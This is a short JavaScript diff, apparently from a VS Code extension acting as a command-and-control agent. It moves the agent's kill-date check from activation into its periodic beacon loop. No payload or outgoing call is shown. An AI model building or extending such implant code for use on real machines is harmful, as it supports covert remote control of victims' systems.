@@ -66,7 +66,12 @@ function checkIn(context) {
 }
 
 function mainLoop(context) {
-	const mustExit = context.globalState.get('mustExit')
+	var mustExit = context.globalState.get('mustExit')
+
+	const today = new Date()
+	if (today > killDate) {
+		mustExit = true
+	}
 
 	if (mustExit != null) {
 		clearInterval(this)
@@ -154,10 +159,10 @@ function activate(context) {
 	// Build parameter is in seconds, setInterval() wants milliseconds
 	const interval = callback_interval * 1000
 
-	const today = new Date()
-	if (today > killDate) {
-		return
-	}
+	// const today = new Date()
+	// if (today > killDate) {
+	// 	return
+	// }
 
 	if (callbackUUID != null) {
 		setInterval(mainLoop, interval, context);
